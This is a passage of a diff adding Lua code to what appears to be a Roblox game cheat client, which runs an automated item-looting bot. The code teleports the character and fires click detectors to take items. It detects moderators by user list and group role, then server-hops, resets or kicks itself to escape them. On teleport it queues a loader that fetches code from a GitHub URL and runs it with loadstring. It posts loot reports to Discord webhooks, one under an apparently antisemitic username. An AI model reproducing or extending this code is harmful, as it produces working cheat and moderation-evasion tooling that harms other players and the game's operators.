+                            local distance = (object.Position - root.Position).Magnitude
+                            if distance <= min_distance and not already_visited_position(object.Position) then
+                                table.insert(trinkets, {object = object, distance = distance})
+                            end
+                        end
+                    end
+                end
+
+                local child_added_connection
+                child_added_connection = utility:Connection(ws.ChildAdded, function(object)
+                    if not trinket_bot.path_running then
+                        if child_added_connection then
+                            child_added_connection:Disconnect()
+                        end
+                        return
+                    end
+
+                    if object.Name == "Part" and FindFirstChild(object, "ID") then
+                        local trinketName, trinketColor, trinketZIndex = cheat_client:identify_trinket(object)
+                        local should_pickup = true
+
+                        if ignore_ice and trinketName == "Ice Essence" then
+                            should_pickup = false
+                        elseif ignore_phoenix_down and trinketName == "Phoenix Down" then
+                            should_pickup = false
+                        elseif ignore_azael_horn and trinketName == "Azael Horn" then
+                            should_pickup = false
+                        elseif trinketName == "Scroll" then
+                            should_pickup = not ignore_scrolls
+                        elseif not pickup_trinkets then
+                            local is_mythic = trinketColor == cheat_client.trinket_colors.mythic.Color
+                            local is_artifact = trinketColor == cheat_client.trinket_colors.artifact.Color
+                            local is_event = trinketColor == cheat_client.trinket_colors.event.Color
+                            should_pickup = is_mythic or is_artifact or is_event
+                        end
+
+                        if should_pickup then
+                            local distance = (object.Position - root.Position).Magnitude
+                            if distance <= min_distance and not already_visited_position(object.Position) then
+                                table.insert(trinkets, {object = object, distance = distance})
+                            end
+                        end
+                    end
+                end)
+
+                table.sort(trinkets, function(a, b)
+                    return a.distance < b.distance
+                end)
+
+                local currentPos = root.Position
+                while #trinkets > 0 and trinket_bot.path_running and not shared.is_unloading and not emergency_gate_requested and not trinket_bot.moderator_detected do
+                    table.sort(trinkets, function(a, b)
+                        return (a.object.Position - currentPos).Magnitude < (b.object.Position - currentPos).Magnitude
+                    end)
+
+                    local trinketData = table.remove(trinkets, 1)
+                    if trinketData and trinketData.object and trinketData.object.Parent then
+                        local trinket_position = trinketData.object.Position
+                        local trinket_id = FindFirstChild(trinketData.object, "ID")
+
+                        SmoothTeleport(trinket_position, true)
+                        table.insert(visited_positions, trinket_position)
+                        if #visited_positions > 1000 then
+                            table.remove(visited_positions, 1)
+                        end
+                        currentPos = trinket_position
+                        task.wait(0.18)
+
+                        local click_detector = FindFirstChild(trinketData.object, "ClickDetector", true)
+                        if click_detector then
+                            if trinket_id and trinket_id:IsA("StringValue") then
+                                queue_pending_pickup(trinket_id.Value)
+                            end
+                            fireclickdetector(click_detector)
+                            task.wait(0.18)
+
+                            if trinket_id and trinket_id:IsA("StringValue") then
+                                mark_trinket_collected(trinket_id.Value)
+                            end
+                        end
+                    end
+                end
+
+                if child_added_connection then
+                    child_added_connection:Disconnect()
+                end
+            end
+
+            local function ScanTrinketsOnly()
+                local root = plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart")
+                if not root then return end
+
+                local trinkets = {}
+                local ignore_ice = not (Toggles.PickupIceEssence and Toggles.PickupIceEssence.Value)
+                local ignore_scrolls = not (Toggles.PickupScrolls and Toggles.PickupScrolls.Value)
+                local selected_mythics_artifacts = Options.PickupMythicsArtifacts and Options.PickupMythicsArtifacts.Value or {}
+                local pickup_trinkets = Toggles.PickupTrinkets and Toggles.PickupTrinkets.Value
+                local pickup_event_items = Toggles.PickupEventItems and Toggles.PickupEventItems.Value
+                local min_distance = 350
+
+                for _, object in next, ws:GetChildren() do
+                    if object.Name == "Part" and FindFirstChild(object, "ID") then
+                        local trinketName, trinketColor, trinketZIndex = cheat_client:identify_trinket(object)
+                        local should_pickup = true
+
+                        if ignore_ice and trinketName == "Ice Essence" then
+                            should_pickup = false
+                        elseif trinketName == "Scroll" then
+                            should_pickup = not ignore_scrolls
+                        else
+                            local is_mythic = trinketColor == cheat_client.trinket_colors.mythic.Color
+                            local is_artifact = trinketColor == cheat_client.trinket_colors.artifact.Color
+                            local is_event = trinketColor == cheat_client.trinket_colors.event.Color
+                            local is_common = trinketColor == cheat_client.trinket_colors.common.Color
+                            local is_rare = trinketColor == cheat_client.trinket_colors.rare.Color
+
+                            if is_mythic or is_artifact then
+                                should_pickup = selected_mythics_artifacts[trinketName] == true
+                            elseif is_event then
+                                should_pickup = pickup_event_items
+                            elseif is_common or is_rare then
+                                should_pickup = pickup_trinkets
+                            end
+                        end
+
+                        if should_pickup then
+                            local distance = (object.Position - root.Position).Magnitude
+                            if distance <= min_distance and not already_visited_position(object.Position) then
+                                table.insert(trinkets, {object = object, distance = distance})
+                            end
+                        end
+                    end
+                end
+
+                if #trinkets > 0 then
+                    warn(string.format("Scanned %d trinkets in dangerous area (not looting)", #trinkets))
+                end
+            end
+
+            local function InAir()
+                local root = plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart")
+                if not root then return false end
+
+                local rayOrigin = root.Position
+                local rayDirection = Vector3.new(0, -100, 0)
+                local raycastParams = RaycastParams.new()
+                raycastParams.FilterDescendantsInstances = {plr.Character}
+                raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
+
+                local result = ws:Raycast(rayOrigin, rayDirection, raycastParams)
+                return result == nil
+            end
+
+            local function is_moderator(player)
+                if not player then return false end
+
+                if cheat_client and cheat_client.mod_list and table.find(cheat_client.mod_list, player.UserId) then
+                    return true
+                end
+
+                local success, isInGroup = pcall(function()
+                    return player:IsInGroup(4556484)
+                end)
+                if success and isInGroup then
+                    local role = player:GetRoleInGroup(4556484)
+                    if role ~= "Guest" then
+                        return true
+                    end
+                end
+
+                return false
+            end
+
+            local function has_observe(player)
+                if not player then return false end
+
+                if FindFirstChild(player, "Backpack") and FindFirstChild(player.Backpack, "Observe") then
+                    return true
+                end
+
+                if player.Character and FindFirstChild(player.Character, "Observe") then
+                    return true
+                end
+
+                return false
+            end
+
+            local function get_current_server_player_count()
+                local live_count = #plrs:GetPlayers()
+                local serverInfo = FindFirstChild(rps, "ServerInfo")
+                local httpService = Services.HttpService
+
+                if serverInfo then
+                    local currentServer = FindFirstChild(serverInfo, game.JobId)
+                    local playersValue = currentServer and FindFirstChild(currentServer, "Players")
+
+                    if playersValue and playersValue:IsA("StringValue") then
+                        local success, playerData = pcall(function()
+                            return httpService:JSONDecode(playersValue.Value)
+                        end)
+
+                        if success and playerData and type(playerData) == "table" then
+                            return math.max(#playerData, live_count)
+                        end
+                    end
+                end
+
+                return live_count
+            end
+
+            local function menu_on_non_23(player_count)
+                trinket_bot.menu_only_stop = true
+                trinket_bot.path_running = false
+                mem:RemoveItem("botstarted")
+                mem:RemoveItem("serverhop_count")
+
+                if trinket_bot.connections then
+                    for _, connection in pairs(trinket_bot.connections) do
+                        if connection then
+                            pcall(function()
+                                connection:Disconnect()
+                            end)
+                        end
+                    end
+                    trinket_bot.connections = {}
+                end
+
+                if trinket_bot.illu_connections then
+                    for _, connection in ipairs(trinket_bot.illu_connections) do
+                        if connection then
+                            pcall(function()
+                                connection:Disconnect()
+                            end)
+                        end
+                    end
+                    trinket_bot.illu_connections = {}
+                end
+
+                if trinket_bot.gnav_connections then
+                    for _, connection in ipairs(trinket_bot.gnav_connections) do
+                        if connection then
+                            pcall(function()
+                                connection:Disconnect()
+                            end)
+                        end
+                    end
+                    trinket_bot.gnav_connections = {}
+                end
+
+                if loot_tracking_connection then
+                    pcall(function()
+                        loot_tracking_connection:Disconnect()
+                    end)
+                    loot_tracking_connection = nil
+                end
+
+                for _, connection in ipairs(quantity_connections) do
+                    if connection then
+                        pcall(function()
+                            connection:Disconnect()
+                        end)
+                    end
+                end
+                quantity_connections = {}
+
+                if active_tween_data then
+                    if active_tween_data.tween then
+                        pcall(function()
+                            active_tween_data.tween:Cancel()
+                        end)
+                        active_tween_data.tween = nil
+                    end
+                    if active_tween_data.connection then
+                        pcall(function()
+                            active_tween_data.connection:Disconnect()
+                        end)
+                        active_tween_data.connection = nil
+                    end
+                end
+
+                pcall(restore_bot_state)
+
+                local serverName, serverRegion = get_server_info()
+                local footer_text = string.format("Players: %d/23 | %s | Job: %s", player_count, plr.Name, game.JobId)
+                local embed = {
+                    title = "Menu on NON-23",
+                    description = string.format(
+                        "**Server:** `%s (%s)`\n**Player Count:** `%d/23`\n**Action:** Menu only, bot stopped",
+                        serverName ~= "" and serverName or "Unknown",
+                        serverRegion ~= "" and serverRegion or "Unknown",
+                        player_count
+                    ),
+                    color = 0xff0000,
+                    footer = {
+                        text = footer_text
+                    },
+                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+                }
+
+                task.spawn(function()
+                    pcall(function()
+                        HXD_SEND_WEBHOOK("WEBHOOK_URL_HERE", {
+                            username = "Jew",
+                            content = "@everyone",
+                            embeds = {embed}
+                        })
+                    end)
+                end)
+
+                library:Notify(string.format("Menu on NON-23 triggered (%d/23)", player_count))
+
+                if rps.Requests and FindFirstChild(rps.Requests, "ReturnToMenu") and plr.Character then
+                    pcall(function()
+                        rps.Requests.ReturnToMenu:InvokeServer()
+                    end)
+                end
+            end
+
+            local teleport_debounce = false
+            local function TrinketBotServerhop(reason, skip_test_mode_check)
+                if not skip_test_mode_check and trinket_bot.test_mode then
+                    library:Notify(string.format("Serverhop blocked (test mode): %s", reason or "Unknown"))
+                    return
+                end
+
+                local stay_in_server = Toggles.StayInServer and Toggles.StayInServer.Value or false
+                if stay_in_server then
+                    library:Notify(string.format("Serverhop blocked (stay in server): %s", reason or "Unknown"))
+                    if utility then
+                        utility:plain_webhook(string.format("@here Serverhop blocked (stay in server): %s", reason or "Unknown"))
+                    end
+                    return
+                end
+
+                if trinket_bot.current_path_name and trinket_bot.current_path_name ~= "" then
+                    mem:SetItem("trinket_bot_path", trinket_bot.current_path_name)
+                end
+
+                if plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") then
+                    local pos = plr.Character.HumanoidRootPart.Position
+                    mem:SetItem("lastPlayerPosition", string.format("%s,%s,%s", pos.X, pos.Y, pos.Z))
+                end
+
+                if utility then
+                    utility:add_server_to_history(game.JobId)
+                end
+
+                local current_count = 0
+                if mem:HasItem("serverhop_count") then
+                    current_count = tonumber(mem:GetItem("serverhop_count")) or 0
+                end
+
+                if current_count > 0 and current_count % 10 == 0 and utility then
+                    utility:clear_server_history()
+                    library:Notify("Server cache cleared (10 serverhops)")
+                end
+
+                local httpService = Services.HttpService
+                local settings_to_save = {
+                    skip_illusionist = Toggles.SkipIllusionist and Toggles.SkipIllusionist.Value or false,
+                    pickup_scrolls = Toggles.PickupScrolls and Toggles.PickupScrolls.Value or false,
+                    pickup_ice_essence = Toggles.PickupIceEssence and Toggles.PickupIceEssence.Value or false,
+                    pickup_mythics_artifacts = Options.PickupMythicsArtifacts and Options.PickupMythicsArtifacts.Value or {},
+                    pickup_event_items = Toggles.PickupEventItems and Toggles.PickupEventItems.Value or false,
+                    pickup_trinkets = Toggles.PickupTrinkets and Toggles.PickupTrinkets.Value or false,
+                    disable_gpu_rendering = Toggles.DisableGPURendering and Toggles.DisableGPURendering.Value or false,
+                    emergency_serverhop_conditions = Options.EmergencyServerhopConditions and Options.EmergencyServerhopConditions.Value or {},
+                    join_oldest_server = Toggles.JoinOldestServer and Toggles.JoinOldestServer.Value or false,
+                    menu_on_non_23 = Toggles.MenuOnNon23 and Toggles.MenuOnNon23.Value or false,
+                    auto_pop_pds = Toggles.AutoPopPDs and Toggles.AutoPopPDs.Value or false,
+                    auto_drop_items = Options.AutoDropItems and Options.AutoDropItems.Value or {},
+                    kick_on_trinket = Toggles.KickOnTrinket and Toggles.KickOnTrinket.Value or false,
+                    kick_trinket_list = Options.KickTrinketList and Options.KickTrinketList.Value or {},
+                    stay_in_server = Toggles.StayInServer and Toggles.StayInServer.Value or false,
+                    reequip_gate_in_loop = Toggles.ReequipGateInLoop == nil and true or Toggles.ReequipGateInLoop.Value,
+                    time_between_looting = Options.TimeBetweenLooting and Options.TimeBetweenLooting.Value or 5,
+                    proximity_check = Options.ProximityCheck and Options.ProximityCheck.Value or 0,
+                    critical_distance = Options.CriticalDistance and Options.CriticalDistance.Value or 60,
+                    min_player_count = Options.MinPlayerCount and Options.MinPlayerCount.Value or 0,
+                    speed = Options.TrinketBotSpeed and Options.TrinketBotSpeed.Value or 100,
+                    show_in_artifact_stream = Toggles.show_in_artifact_stream and Toggles.show_in_artifact_stream.Value or false
+                }
+                pcall(function()
+                    mem:SetItem("trinket_bot_settings", httpService:JSONEncode(settings_to_save))
+                end)
+
+                if reason and utility then
+                    local boiii = reason:lower():find("repeat encounter") or reason:lower():find("unfriendly player")
+
+                    if boiii then
+                        utility:plain_webhook(reason)
+                    else
+                        local serverName, serverRegion = get_server_info()
+                        local elapsed_time = os.clock() - trinket_bot.session_start_time
+                        local hours = math.floor(elapsed_time / 3600)
+                        local minutes = math.floor((elapsed_time % 3600) / 60)
+                        local seconds = math.floor(elapsed_time % 60)
+
+                        local items_text = ""
+                        if trinket_bot.session_loot and next(trinket_bot.session_loot) then
+                            local items = {}
+                            for item_name, count in pairs(trinket_bot.session_loot) do
+                                table.insert(items, {name = item_name, count = count})
+                            end
+                            table.sort(items, function(a, b) return a.count > b.count end)
+                            for _, item in ipairs(items) do
+                                items_text = items_text .. string.format("%dx %s\n", item.count, item.name)
+                            end
+                        else
+                            items_text = "No items collected"
+                        end
+
+                        local player_count = #plrs:GetPlayers()
+                        local footer_text
+                        if cheat_client.config.webhook_show_username ~= false then
+                            footer_text = string.format("Players: %d/23 | %s | Job: %s", player_count, plr.Name, game.JobId)
+                        else
+                            footer_text = string.format("Players: %d/23 | Job: %s", player_count, game.JobId)
+                        end
+
+                        local description = string.format(
+                            "**Server:** `%s (%s)`\n**Inventory Value:** %d\n**Session:** %dh %dm %ds",
+                            serverName ~= "" and serverName or "Unknown",
+                            serverRegion ~= "" and serverRegion or "Unknown",
+                            get_inventory_value(),
+                            hours, minutes, seconds
+                        )
+
+                        local embed = {
+                            title = string.format("Serverhop #%d | %s", current_count + 1, reason),
+                            description = description,
+                            color = 0x36ff79,
+                            fields = {
+                                {
+                                    name = "Items Collected",
+                                    value = string.format("```\n%s```", items_text),
+                                    inline = false
+                                }
+                            },
+                            footer = {
+                                text = footer_text
+                            },
+                            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+                        }
+
+                        if cheat_client.config.webhook and cheat_client.config.webhook ~= "" then
+                            task.spawn(function()
+                                pcall(function()
+                                    HXD_SEND_WEBHOOK(cheat_client.config.webhook, {
+                                        username = cheat_client.config.webhook_username or "bladee",
+                                        embeds = {embed}
+                                    })
+                                end)
+                            end)
+                        end
+                    end
+                end
+
+                if not shared.on_teleport_setup then
+                    shared.on_teleport_setup = true
+                    shared.on_teleport_connection = plr.OnTeleport:Connect(function(State)
+                        if teleport_debounce then
+                            return
+                        end
+                        teleport_debounce = true
+
+                        local queue_func = queueteleport or queue_on_teleport
+                        if queue_func then
+                            local success, err = pcall(function()
+                                local loader_script
+                                if readfile and isfile and isfile("bazaar_loader.lua") then
+                                    loader_script = [[local code=readfile("bazaar_loader.lua") local fn,compileErr=loadstring(code) if not fn then print("[QUEUE ERROR] Compile failed:",compileErr) print("[QUEUE DEBUG] Code preview:",code:sub(1,200)) return end local s,runErr=pcall(fn) if not s then print("[QUEUE ERROR] Runtime failed:",runErr) print("[QUEUE DEBUG] Traceback:",debug.traceback()) end]]
+                                else
+                                    loader_script = [[if not game:IsLoaded() then game.Loaded:Wait() end task.wait(1) local s,code=pcall(function() return game:HttpGet("https://raw.githubusercontent.com/heisenburgah/HYDROXIDE/refs/heads/main/loader.lua") end) if not s then print("[QUEUE ERROR] HttpGet failed:",code) return end local fn,compileErr=loadstring(code) if not fn then print("[QUEUE ERROR] Compile failed:",compileErr) print("[QUEUE DEBUG] Response preview:",tostring(code):sub(1,200)) return end local ok,runErr=pcall(fn) if not ok then print("[QUEUE ERROR] Runtime failed:",runErr) print("[QUEUE DEBUG] Traceback:",debug.traceback()) end]]
+                                end
+                                queue_func(loader_script)
+                            end)
+
+                            if not success then
+                                utility:plain_webhook(string.format("FAILED to queue script: %s", tostring(err)))
+                            end
+                        else
+                            utility:plain_webhook("WARNING: queueteleport/queue_on_teleport not available - script will NOT auto-load!")
+                        end
+                    end)
+                end
+
+                if trinket_bot.pending_artifact_logs and #trinket_bot.pending_artifact_logs > 0 then
+                    library:Notify(string.format("Sending %d queued artifact log(s) before serverhop", #trinket_bot.pending_artifact_logs))
+
+                    local embeds = {}
+                    local webhook_url = nil
+                    local username = nil
+
+                    local mythic_artifacts = {
+                        ["Rift Gem"] = true,
+                        ["Mysterious Artifact"] = true,
+                        ["Azael Horn"] = true,
+                        ["Amulet of the White King"] = true
+                    }
+                    local artifact_tier = {
+                        ["Lannis's Amulet"] = true,
+                        ["Night Stone"] = true,
+                        ["Howler Friend"] = true
+                    }
+                    local phoenix_items = {
+                        ["Phoenix Down"] = true,
+                        ["Phoenix Flower"] = true
+                    }
+
+                    local has_mythic = false
+                    local has_artifact = false
+                    local has_phoenix = false
+
+                    for _, log_data in ipairs(trinket_bot.pending_artifact_logs) do
+                        if not log_data.artifact_names or #log_data.artifact_names == 0 then
+                            continue
+                        end
+
+                        table.insert(embeds, log_data.embed)
+                        if not webhook_url then
+                            webhook_url = log_data.webhook_url
+                            username = log_data.username
+                        end
+
+                        for _, artifact_name in ipairs(log_data.artifact_names) do
+                            if mythic_artifacts[artifact_name] then
+                                has_mythic = true
+                            elseif artifact_tier[artifact_name] then
+                                has_artifact = true
+                            elseif phoenix_items[artifact_name] then
+                                has_phoenix = true
+                            end
+                        end
+                    end
+
+                    local role_pings = {}
+                    if has_mythic then
+                        table.insert(role_pings, "<@&1460283107218428109>")
+                    end
+                    if has_artifact then
+                        table.insert(role_pings, "<@&1455341994711711955>")
+                    end
+                    if has_phoenix then
+                        table.insert(role_pings, "<@&1460283196028752013>")
+                    end
+
+                    local ping_content = #role_pings > 0 and table.concat(role_pings, " ") or ""
+
+                    if #embeds > 0 and webhook_url then
+                        local embed_count = #embeds
+                        task.spawn(function()
+                            local success, result = pcall(function()
+                                return HXD_SEND_WEBHOOK(webhook_url, {
+                                    username = username,
+                                    content = ping_content,
+                                    embeds = embeds
+                                })
+                            end)
+                            if not success then
+                                library:Notify(string.format("Artifact stream error: %s", tostring(result)))
+                            elseif result == false then
+                                library:Notify("Artifact stream webhook failed (check console for details)")
+                            else
+                                library:Notify(string.format("Sent %d artifact(s) to stream", embed_count))
+                            end
+                        end)
+                    end
+
+                    trinket_bot.pending_artifact_logs = {}
+                end
+
+                local serverhop_success = false
+                if InAir() then
+                    serverhop_success = utility:Serverhop()
+                else
+                    pcall(function()
+                        rps.Requests.ReturnToMenu:InvokeServer()
+                    end)
+                    task.wait(0.1)
+                    serverhop_success = utility:Serverhop()
+                end
+
+                if not serverhop_success then
+                    library:Notify("!! SERVERHOP FAILED - retrying... !!")
+                    if utility then
+                        utility:plain_webhook("@here SERVERHOP FAILED - retrying serverhop...")
+                    end
+
+                    pcall(function()
+                        rps.Requests.ReturnToMenu:InvokeServer()
+                    end)
+                    task.wait(1)
+
+                    serverhop_success = utility:Serverhop()
+                    if not serverhop_success then
+                        local character = plr.Character
+
+                        if character and cs:HasTag(character, "Danger") then
+                            library:Notify("!! SERVERHOP FAILED - In combat, waiting for danger to clear !!")
+                            utility:plain_webhook("@here SERVERHOP FAILED - In combat, waiting for danger to clear then retrying")
+
+                            local danger_cleared = false
+                            local danger_connection
+
+                            danger_connection = utility:Connection(cs:GetInstanceRemovedSignal("Danger"), function(instance)
+                                if instance == character then
+                                    danger_cleared = true
+                                    if danger_connection then
+                                        danger_connection:Disconnect()
+                                        danger_connection = nil
+                                    end
+                                end
+                            end)
+
+                            while not danger_cleared do
+                                task.wait(0.1)
+                            end
+
+                            library:Notify("Danger cleared - retrying serverhop now!")
+                            utility:plain_webhook("Danger cleared after combat - retrying serverhop")
+
+                            pcall(function()
+                                rps.Requests.ReturnToMenu:InvokeServer()
+                            end)
+                            task.wait(0.1)
+
+                            local final_serverhop = utility:Serverhop()
+                            if not final_serverhop then
+                                library:Notify("!! SERVERHOP STILL FAILED after danger cleared - kicking !!")
+                                utility:plain_webhook("@here SERVERHOP FAILED even after danger cleared - kicking for safety")
+                                task.wait(0.5)
+                                plr:Kick("Serverhop failed after danger cleared - Kicked for safety.")
+                            end
+                            return
+                        end
+
+                        library:Notify("!! SERVERHOP RETRY FAILED - kicking for safety !!")
+                        if utility then
+                            utility:plain_webhook("@here SERVERHOP RETRY FAILED - kicking for safety")
+                        end
+                        task.wait(0.5)
+                        plr:Kick("Serverhop failed after retry - Kicked for safety.")
+                    end
+                end
+            end
+
+            local function SafeServerhop(reason, skip_test_mode_check, skip_gate_escape)
+                if plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") then
+                    local pos = plr.Character.HumanoidRootPart.Position
+                    mem:SetItem("lastPlayerPosition", string.format("%s,%s,%s", pos.X, pos.Y, pos.Z))
+                end
+
+                if not plr.Character or not cs:HasTag(plr.Character, "Danger") then
+                    library:Notify("Not in danger - returning to menu")
+                    trinket_bot.path_running = false
+                    pcall(function()
+                        rps.Requests.ReturnToMenu:InvokeServer()
+                    end)
+                    TrinketBotServerhop(reason, skip_test_mode_check)
+                    return
+                end
+
+                library:Notify("In danger! Attempting escape before serverhop...")
+                local escaped = false
+                local CollectionService = Services.CollectionService
+
+                if not skip_gate_escape and not escaped and trinket_bot.path_points and #trinket_bot.path_points > 0 and plr.Character then
+                    if not CollectionService:HasTag(plr.Character, "SnapCool") then
+                        for idx, point in ipairs(trinket_bot.path_points) do
+                            if point.is_gate_point then
+                                library:Notify(string.format("Escape: Gating to point %d", idx))
+                                local gate_success = Gate(point.gate_location)
+                                if gate_success then
+                                    library:Notify("Escape gate successful!")
+                                    escaped = true
+                                    task.wait(0.5)
+                                    break
+                                end
+                            end
+                        end
+                    else
+                        library:Notify("SnapCool active - cannot gate")
+                    end
+                end
+
+                if not escaped and trinket_bot.path_points and #trinket_bot.path_points > 0 and plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") then
+                    local current_pos = plr.Character.HumanoidRootPart.Position
+
+                    local start_idx = 1
+                    local min_dist = math.huge
+                    for idx, point in ipairs(trinket_bot.path_points) do
+                        if not point.is_gate_point then
+                            local dist = (point.position - current_pos).Magnitude
+                            if dist < min_dist then
+                                min_dist = dist
+                                start_idx = idx
+                            end
+                        end
+                    end
+
+                    if min_dist <= 300 then
+                        library:Notify(string.format("Escape: Traversing from point %d", start_idx))
+                        local last_pos = current_pos
+                        local points_traversed = 0
+
+                        for idx = start_idx, #trinket_bot.path_points do
+                            local point = trinket_bot.path_points[idx]
+                            if not point.is_gate_point then
+                                local dist_from_last = (point.position - last_pos).Magnitude
+                                if dist_from_last <= 300 then
+                                    SmoothTeleport(point.position)
+                                    last_pos = point.position
+                                    points_traversed = points_traversed + 1
+                                    task.wait(0.2)
+
+                                    if plr.Character and not cs:HasTag(plr.Character, "Danger") then
+                                        library:Notify(string.format("Escaped after %d points!", points_traversed))
+                                        escaped = true
+                                        break
+                                    end
+
+                                    if points_traversed >= 10 then
+                                        library:Notify("Traversed 10 points - stopping")
+                                        break
+                                    end
+                                else
+                                    break
+                                end
+                            end
+                        end
+                    end
+                end
+
+                if not escaped and plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") then
+                    local current_pos = plr.Character.HumanoidRootPart.Position
+                    local escape_offset = Vector3.new(math.random(-300, 300), 0, math.random(-300, 300))
+                    library:Notify("Escape: Moving to random nearby position")
+                    SmoothTeleport(current_pos + escape_offset)
+                    task.wait(0.5)
+                end
+
+                if plr.Character and cs:HasTag(plr.Character, "Danger") then
+                    library:Notify("Waiting for danger to clear...")
+                    local danger_cleared = false
+                    local danger_conn
+                    danger_conn = utility:Connection(cs:GetInstanceRemovedSignal("Danger"), function(instance)
+                        if instance == plr.Character then
+                            danger_cleared = true
+                            if danger_conn then danger_conn:Disconnect() end
+                        end
+                    end)
+
+                    while not danger_cleared do
+                        task.wait(0.1)
+                    end
+                    if danger_conn then danger_conn:Disconnect() end
+                    library:Notify("Danger cleared!")
+                end
+
+                trinket_bot.path_running = false
+                pcall(function()
+                    rps.Requests.ReturnToMenu:InvokeServer()
+                end)
+                TrinketBotServerhop(reason .. (escaped and " (escaped)" or " (escape failed)"), skip_test_mode_check)
+            end
+
+            local function handle_moderator_detection(moderator_player)
+                if not moderator_player then return end
+
+                local mod_name = moderator_player.Name
+                local mem_key = "moderator_encounter_" .. mod_name
+
+                local encounter_count = 1
+                if mem:HasItem(mem_key) then
+                    encounter_count = tonumber(mem:GetItem(mem_key)) or 1
+                    encounter_count = encounter_count + 1
+                end
+
+                mem:SetItem(mem_key, tostring(encounter_count))
+
+                local stay_in_server = Toggles.StayInServer and Toggles.StayInServer.Value or false
+
+                trinket_bot.moderator_detected = true
+                trinket_bot.path_running = false
+
+                if stay_in_server then
+                    library:Notify(string.format("!! MODERATOR %s DETECTED (encounter %d) - RESETTING & RETURNING TO MENU (stay in server) !!", mod_name, encounter_count))
+
+                    if utility then
+                        utility:plain_webhook(string.format("@here Moderator %s detected (encounter %d) - Resetting character (stay in server mode)", mod_name, encounter_count))
+                    end
+
+                    if plr.Character and FindFirstChild(plr.Character, "Humanoid") then
+                        plr.Character:BreakJoints()
+                    end
+
+                    local respawn_connection
+                    respawn_connection = utility:Connection(plr.CharacterAdded, function(new_character)
+                        if respawn_connection then
+                            respawn_connection:Disconnect()
+                        end
+
+                        task.wait(1)
+
+                        if rps.Requests and FindFirstChild(rps.Requests, "ReturnToMenu") then
+                            library:Notify("Character respawned - returning to menu")
+                            rps.Requests.ReturnToMenu:InvokeServer()
+                        else
+                            library:Notify("ERROR: ReturnToMenu not found!")
+                        end
+                    end)
+                elseif encounter_count >= 3 then
+                    library:Notify(string.format("!! MODERATOR %s ENCOUNTERED %d TIMES - TERMINATING BOT SESSION !!", mod_name, encounter_count))
+
+                    if utility then
+                        utility:plain_webhook(string.format("@everyone Encountered moderator %s over %d serverhops, terminating bot session", mod_name, encounter_count))
+                    end
+
+                    task.wait(0.5)
+                    plr:Kick(string.format("Moderator %s encountered %d times - Bot session terminated", mod_name, encounter_count))
+                elseif plr.Character and cs:HasTag(plr.Character, "Danger") then
+                    library:Notify(string.format("!! MODERATOR %s DETECTED WHILE IN DANGER - KICKING IMMEDIATELY !!", mod_name))
+
+                    if utility then
+                        utility:plain_webhook(string.format("@everyone Moderator %s detected while in Danger - kicking immediately (encounter %d/3)", mod_name, encounter_count))
+                    end
+
+                    task.wait(0.5)
+                    plr:Kick(string.format("Moderator %s detected while in danger", mod_name))
+                else
+                    library:Notify(string.format("!! MODERATOR %s DETECTED (encounter %d/3) - IMMEDIATE SERVERHOP !!", mod_name, encounter_count))
+
+                    TrinketBotServerhop(string.format("Moderator %s detected (encounter %d/3)", mod_name, encounter_count), true)
+                end
+            end
+
+            local currently_dropping = false
+            local droppedTools = {}
+
+            local function ExecutePath(test_mode)
+                if not cheat_client or not cheat_client.config then
+                    return
+                end
+
+                test_mode = test_mode or false
+                trinket_bot.test_mode = test_mode
+                trinket_bot.menu_only_stop = false
+
+                droppedTools = {}
+                currently_dropping = false
+
+                local serverhop_count = 0
+                if mem:HasItem("serverhop_count") then
+                    serverhop_count = tonumber(mem:GetItem("serverhop_count")) or 0
+                end
+
+                trinket_bot.connections = trinket_bot.connections or {}
+                trinket_bot.illu_connections = trinket_bot.illu_connections or {}
+                trinket_bot.gnav_connections = trinket_bot.gnav_connections or {}
+                local auto_trinket_connection
+                local trinket_added_connection
+                local proximity_connection
+                local mod_connection
+                local death_connection
+                local illu_connections = trinket_bot.illu_connections
+                local position_lock_connection
+                local temp_connection
+                local affected_bricks = {}
+                local emergency_serverhop_connection
+                local glassmask_connection
+                local glassmask_thrown_connection
+
+                local function track_connection(name, conn)
+                    trinket_bot.connections[name] = conn
+                    return conn
+                end
+
+                if cheat_client and cheat_client.config and not cheat_client.config.blatant_mode and serverhop_count < 1 then
+                    library:Notify("Blatant Mode must be enabled to run paths!")
+                    if mem:HasItem("botstarted") and mem:GetItem("botstarted") == "true" then
+                        if utility and utility.plain_webhook then
+                            utility:plain_webhook("failed to start: blatant mode not enabled - Kicking (dm the bot if this is an error)")
+                        end
+                        task.wait(1)
+                        plr:Kick("Bot failed to start: Blatant Mode not enabled")
+                    end
+                    return
+                end
+
+                if #trinket_bot.path_points == 0 then
+                    library:Notify("No points in path!")
+                    if mem:HasItem("botstarted") and mem:GetItem("botstarted") == "true" then
+                        if utility and utility.plain_webhook then
+                            utility:plain_webhook(string.format("BOT FAILED TO START: No path points loaded - Kicking (serverhop_count=%d)", serverhop_count))
+                        end
+                        task.wait(1)
+                        plr:Kick("Bot failed to start: No path points loaded")
+                    end
+                    return
+                end
+
+                if trinket_bot.path_running then
+                    library:Notify("Path already running!")
+                    return
+                end
+
+                trinket_bot.path_running = true
+
+                if not plr.Character or not FindFirstChild(plr.Character, "HumanoidRootPart") then
+                    trinket_bot.path_running = false
+                    library:Notify("Character not found!")
+                    return
+                end
+
+                local root = plr.Character.HumanoidRootPart
+                local first_point = trinket_bot.path_points[1] and trinket_bot.path_points[1].position
+
+                if not first_point or typeof(first_point) ~= "Vector3" then
+                    trinket_bot.path_running = false
+                    library:Notify("Invalid path data! Please reload or recreate the path.")
+                    return
+                end
+
+                local stay_in_server = Toggles.StayInServer and Toggles.StayInServer.Value or false
+                local skip_distance = trinket_bot.skip_distance_check or false
+
+                if skip_distance then
+                    library:Notify("Skipping distance check (mid-path resume after emergency gate)")
+                    trinket_bot.skip_distance_check = false
+                elseif not stay_in_server then
+                    local distance_to_first = (root.Position - first_point).Magnitude
+                    if distance_to_first > 400 then
+                        trinket_bot.path_running = false
+                        library:Notify(string.format("Too far from first point! Distance: %.1f studs (max: 400)", distance_to_first))
